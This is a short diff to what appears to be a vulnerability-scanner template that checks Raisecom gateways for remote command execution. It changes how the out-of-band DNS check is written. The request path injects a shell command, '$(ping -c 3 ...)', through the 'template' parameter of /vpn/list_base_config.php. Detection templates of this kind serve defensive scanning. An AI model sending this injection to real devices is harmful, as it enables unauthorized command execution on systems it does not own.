@@ -13,13 +13,10 @@ info:
   tags: raisecom,geteway,rce
   created: 2025/3/28
 
-set:
-  oob: oob()
-  oobDNS: oob.DNS
 rules:
   r0:
     request:
       method: GET
-      path: /vpn/list_base_config.php?type=mod&parts=base_config&template=%24(ping%20-c%203%20{{oobDNS}})
-    expression: response.status == 200 && oobCheck(oob, oob.ProtocolDNS, 3)
+      path: /vpn/list_base_config.php?type=mod&parts=base_config&template=%24(ping%20-c%203%20{{oob.DNS}})
+    expression: response.status == 200 && oobCheck(oob.ProtocolDNS, 5)
 expression: r0()
